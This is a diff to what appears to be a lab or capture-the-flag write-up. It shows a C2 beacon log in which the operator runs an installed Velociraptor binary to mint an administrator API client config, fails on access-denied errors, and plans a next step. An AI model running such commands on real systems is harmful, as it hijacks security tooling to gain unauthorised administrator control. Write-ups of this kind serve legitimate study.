@@ -700,3 +700,27 @@ Looking at the contents of the directory, it looks to be a velociraptor install
 
 And the server and client is stored in program files
 
+```python
++--- Task [46e00975] closed ----------------------------------------------------------+
+
+[12/08 21:05:34] ethan [392c939d] beacon > powershell .\velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_client --name admin --role administrator \programdata\api.config.yaml
+[12/08 21:05:34] [*] Task: create new process
+[12/08 21:05:35] [*] Agent called server, sent [232 bytes]
+[12/08 21:05:35] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c .\velociraptor-v0.72.4-windows-amd64.exe --config server.config.yaml config api_client --name admin --role administrator \programdata\api.config.yaml started with PID 1292 (output - with output)
+[12/08 21:05:39] [+] Job [392c939d] output:
+[ERROR] 2026-08-12T13:05:37-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is denied. 
+[ERROR] 2026-08-12T13:05:37-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is denied. 
+[ERROR] 2026-08-12T13:05:37-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is denied. 
+Creating API client file on \programdata\api.config.yaml.
+[ERROR] 2026-08-12T13:05:37-07:00 Unable to open file \\?\c:\datastore\acl\admin.json.db: open \\?\c:\datastore\acl\admin.json.db: Access is denied. 
+velociraptor-v0.72.4-windows-amd64.exe: error: config api_client: Unable to set role ACL: open \\?\c:\datastore\acl\admin.json.db: Access is denied.
+[12/08 21:05:39] [+] Job [392c939d] finished
+
++--- Task [392c939d] closed ----------------------------------------------------------+
+```
+
+After some research and reading of the docs, i see i need to create a api config
+
+```python
+
+```
